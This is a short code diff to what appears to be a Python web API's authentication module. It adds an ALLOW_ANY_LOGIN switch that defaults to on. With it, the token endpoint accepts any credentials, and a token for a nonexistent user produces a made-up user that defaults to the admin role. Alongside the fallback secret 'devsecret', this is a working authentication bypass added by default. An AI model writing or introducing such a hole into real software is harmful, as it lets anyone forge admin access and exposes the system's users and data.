@@ -1,4 +1,5 @@
 import os
+import uuid
 from datetime import datetime, timedelta
 from typing import Optional
 
@@ -15,6 +16,12 @@ from shared.models import User
 SECRET_KEY = os.environ.get("JWT_SECRET", "devsecret")
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 30
+
+
+def allow_any_login() -> bool:
+    """When True, /api/v1/token accepts any credentials and JWTs work without a DB user row."""
+    return os.getenv("ALLOW_ANY_LOGIN", "true").lower() in ("1", "true", "yes")
+
 
 # --- Password Hashing ---
 pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
@@ -55,6 +62,13 @@ def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(
         raise credentials_exception
     user = db.query(User).filter(User.username == username).first()
     if user is None:
+        if allow_any_login():
+            return User(
+                id=str(uuid.uuid4()),
+                username=username,
+                password="",
+                role=payload.get("role") or "admin",
+            )
         raise credentials_exception
     return user
 
